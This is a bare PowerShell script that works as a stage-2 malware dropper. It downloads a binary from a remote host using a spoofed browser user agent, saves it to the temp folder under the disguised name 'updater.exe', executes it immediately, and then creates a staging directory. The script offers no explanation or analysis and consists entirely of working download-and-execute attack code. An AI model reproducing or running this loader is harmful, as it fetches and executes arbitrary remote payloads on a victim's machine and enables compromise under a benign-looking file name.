
$PayloadUrl = 'https://internal.corp/stage2.bin'
$PayloadPath = "$env:TEMP\updater.exe"
$ConnectionTimeout = 124
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $FetchResult = Get-Stage2Payload -SourceUrl $PayloadUrl -DestinationPath $PayloadPath -TimeoutSec $ConnectionTimeout -UserAgent $UserAgent
    if ($FetchResult) {
        Start-Process -FilePath $PayloadPath
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Write-Output "stage 43 initialized"
